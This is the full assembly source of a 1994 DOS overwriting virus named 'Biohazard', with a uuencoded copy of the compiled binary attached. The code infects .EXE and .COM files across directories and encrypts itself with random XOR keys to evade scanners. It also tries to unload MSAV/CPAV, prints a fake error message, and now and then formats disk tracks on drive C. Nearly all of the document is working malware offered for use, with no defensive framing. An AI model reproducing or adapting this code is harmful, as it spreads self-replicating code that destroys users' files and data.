;============================================================================
;                  Biohazard
;
;                 by Devil's Advocate
;                 Version 1.0
;                   8/31/94
;
; Overview:  Non-resident overwriting virus.  32 bit random xor encryption.
;        Infects .EXE or .COM files in current directory of drive c:. 
;        Uses ".." method of directory transversal.  Actively seeks \DOS
;        and \WINDOWS directories.  One percent chance per activation
;            of virus formating nine tracks via int 13/05.  Encrypted copies
;            bypass heuristic and signature scanning easily.
;============================================================================

cseg            segment
        assume cs:cseg, ds:cseg
        org 100h
virus_len       equ (virus_end-virus_start)/4+1

start:
        mov     si, offset virus_start  ; encryption head
        mov     cx, virus_len           ;

encrypt_loop:
        db      81h                     ; xor word ptr [si], ????h
        db      34h
encrypt_value_1:
        dw      0000h                   ; first random encryption value
                    
        db      81h                     ; xor word ptr [si+2], ????h
        db      74h
        db      02h
encrypt_value_2:                                   
        dw      0000h                   ; second random encryption value
        add     si, 4
        loop    encrypt_loop
        ret

virus_start:
        mov     ax, 0FA01h              ; remove MSAV/CPAV from  
        mov     dx, 5945h               ; memory
        int     16                      ;
        
        mov     ah, 19h                 ; get current drive
        int     21h                     ; and save 
        push    ax                      ; 
        
        mov     ah, 10h                 ; check if drive c: is ready
        mov     dl, 2                   ; if not...
        int     13h                     ;
        jnc     chdrv                   ; 
        jmp     outta_here              ; ... we're outta here

chdrv:             
        mov     ah, 0Eh                 ; move to C:
        mov     dl, 02h                 ;
        int     21h

        mov     ah, 47h                 ; get current directory
        xor     dl, dl                  ;
        mov     si, offset dir_buffer   ;
        int     21h                     ;
        
file_search:
        mov     dx, offset Exe          ; search for first .exe 
        mov     ah, 4Eh                 ;
        int     21h                     ;
        jnc     kill_it                 ; jmp if no error
        
        mov     dx, offset Com          ; look for .com files now
        mov     ah, 4Eh                 ; 
again:
        int     21h                     ;
        jc      move_up                 ; jmp if no file found

kill_it:
        mov     ax, 4300h               ; get file attributes
        mov     dx, 9eh                 ; pointer to DTA
        int     21h                     ;
        push    cx                      ; save attributes on stack
        
        mov     ax, 4301h               ; set file attributes
        xor     cx, cx                  ; to normal
        int     21h                     ;
        
        mov     ax, 3D02h               ; open file
        mov     dx, 9eh                 ; pointer to DTA
        int     21h                     ;
        
        jc      next_file               ; if error get next file
        
        xchg    ax, bx                  ; move file handle to bx
        mov     ax, 5700h               ; get file date
        int     21h                     ;
        
        push    cx                      ; save file date
        push    dx                      ;
        
get_random:
        mov     ah, 2Ch                 ; dx and (cx-dx)
        int     21h                     ; will be to two
        or      dx, dx                  ; encryption values
        jz      get_random              ;

write_virus:
        mov     word ptr [offset encrypt_value_1], dx   ;
        mov     word ptr [offset e_value_1], dx         ; set
        sub     cx, dx                                  ; encryption
        mov     word ptr [offset encrypt_value_2], cx   ; values
        mov     word ptr [offset e_value_2], cx         ;
        
        mov     si, offset start                        ; copy virus
        mov     di, offset encrypt_buffer               ; to buffer
        mov     cx, (virus_end - start)                 ;
        rep     movsb                                   ;
        
encrypt_in_buffer:
        mov     si, offset ((virus_start-start)+encrypt_buffer)
        mov     cx, virus_len

e_loop:
        db      81h                     ; xor word ptr [si], ????h
        db      34h                     ;
e_value_1:
        dw      0000h                   ; first encryption value
        
        db      81h                     ; xor word ptr [si+2], ????h
        db      74h                     ;
        db      02h                     ;
e_value_2:
        dw      0000h                   ; second encryption value
        
        add     si, 4                   ; next dword to encrypt
        loop    e_loop                  ;
        
        mov     dx, offset encrypt_buffer               ; write
        mov     ah, 40h                                 ; virus to
        mov     cx, virus_end - start                   ; file
        int     21h                                     ;
           
        pop     dx                      ; retrieve file date
        pop     cx                      ;
        
        mov     ax, 5701h               ; restore them to file
        int     21h                     ;
        
        mov     ah, 3eh                 ; close file
        int     21h                     ;
        
        pop     cx                      ; retrieve file attributes
        mov     dx, 9eh                 ;
        mov     ax, 4301h               ; and restore them
        int     21h                     ;
           
next_file:
        mov     ah,4Fh                  ; get next matching file
        jmp     again                   ;
        
move_up:
        mov     dx, offset dir_spec     ; offset of '..'
        mov     ah, 3Bh                 ; change directory
        int     21h                     ;
        jc      get_dos                 ; 
        jmp     file_search
        
get_dos:        
        mov     dx, offset dos_spec     ; offset of "\DOS"
        mov     ah, 3Bh                 ; change dir
        int     21h                     ;
        jc      get_win                 ;
        jmp     file_search
        
get_win:
        mov     dx, offset win_spec     ; offset of "\WINDOWS"
        mov     ah, 3Bh                 ; change dir
        int     21h                     ;
        jc      exit                    ;
        jmp     file_search
        
exit:
        mov     ah, 09h                 ; print string
        mov     dx, offset fake_msg     ; 
        int     21h                     ;
        
        mov     ah, 2Ch                 ; get random number
        int     21h                     ; from system clock
        
        cmp     dl, 0                   ; 1% chance it'll go off
        jnz     outta_here              ;
        
crush_it:
        mov cx, 09h         ; number of tracks to eat
        mov     dl, 02h         ; drive c:
        xor dh, dh          ; start at head 0
        mov si, offset Biohazard    ; very egomaniacal...
uh_oh:
        push    cx          ;
        mov ah, 05h         ; format track service
        mov ch, byte ptr [si]   ; track to format
        int 13h         ; BIOS disk interrupt
        
        add si, 1           ; next letter in message
        add dh, 1           ; next head
        pop     cx          ; restore loop counter
        loop    uh_oh           ; round and round she goes...
        
outta_here:
        mov     dx, offset dir_buffer   ; restore original directory
        mov     ah, 3Bh                 ;
        int     21h                     ;
        
        pop     dx                      ; restore original drive
        mov     ah, 0Eh                 ; 
        int     21h                     ;
                
        mov     ah, 4Ch                 ; return to DOS 
        int     21h                     ;
        
;----------------------------------------------------------------------------
;
; data
Exe             db      '*.EXE',0
Com             db      '*.COM',0
dir_spec        db      '..',0
win_spec        db      '\WINDOWS',0
dos_spec        db      '\DOS',0
fake_msg        db      'Program too big to fit in memory$'
Biohazard       db      42h, 69h, 6Fh, 68H, 61h, 7Ah, 61h, 72h, 64h
virus_end:

dir_buffer      db      64 dup (?)
encrypt_buffer  db      (virus_end - start) + 1 dup (?)

cseg    ends
end     start
        
        
        
        
        



begin 775 biohazrd.com
MOA4!N5@`@30``(%T`@``@\8$XO+#N`'ZND59S1"T&T`
MM`ZR`LTAM$`,TA+PNG$"M#O-(5JT#LTAM$S-(2HN15A%`"HN0T]-`"XN`%Q7
M24Y$3U=3`%Q$3U,`4')O9W)A;2!T;V\@8FEG('1O(&9I="!I;B!M96UO
